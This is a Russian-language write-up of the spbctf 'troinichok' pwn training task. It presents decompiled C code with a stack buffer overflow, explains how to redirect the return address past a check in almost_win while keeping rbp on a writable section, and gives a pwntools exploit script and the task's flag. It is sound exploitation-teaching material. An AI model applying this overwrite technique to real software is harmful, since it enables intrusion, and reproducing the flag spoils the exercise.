[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_troinichok)
Описание:
Почти победа. Опять тренимся перетирать адрес возврата!
`nc 109.233.56.90 11623`
**[troinichok](https://pwn.spbctf.ru/files/aslr/troinichok/troinichok)**

Программа имеет уязвимость переполнения буфера, можно сделать переход на функцию `almost_win` и получить флаг.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}

__int64 vuln()
{
  char buf[108]; // [rsp+0h] [rbp-70h] BYREF
  unsigned int v2; // [rsp+6Ch] [rbp-4h]

  v2 = 42;
  fgets(buf, 256, stdin);
  return inc_leet(v2);
}
```

Переход стоит осуществлять на данные сразу после `if`, чтобы получить флаг и не разбираться в логике работы `inc_leet`.
``` C
int almost_win()
{
  int result; // eax
  _BYTE buf[264]; // [rsp+0h] [rbp-110h] BYREF
  int v2; // [rsp+108h] [rbp-8h]
  int fd; // [rsp+10Ch] [rbp-4h]

  result = leet;
  if ( leet == 1337 )
  {
    fd = open("flag", 0);
    v2 = read(fd, buf, 0x100u);
    write(1, buf, v2);
    return close(fd);
  }
  return result;
}
```

Стоит отметить, что перезаписывать `rbp` на `AAAAAAAA` не получится, т.к. программа сломается, поэтому можно перезаписать `rbp` на случайную `rw` секцию [Memory](../../../../Reverse-pwn/Memory.md)
```
.text:00000000004011CB                 mov     [rbp+fd], eax
.text:00000000004011CE                 lea     rcx, [rbp+buf]
.text:00000000004011D5                 mov     eax, [rbp+fd]
```

Эксплоит:
``` python
io = start()

rbp = p64(0x404000 + 0x500)
target = p64(0x4011B5)

payload = b'A' * 108 + p32(0) + rbp + target
io.sendline(payload)

io.interactive()
```

Запуск:
![{5867D17B-4E2D-448D-98FF-7F3BBF27572D}](../../../../z.%20Images/{5867D17B-4E2D-448D-98FF-7F3BBF27572D}.png)

Ответ: `spbctf{38102beb39eef92b972454827acb4939}`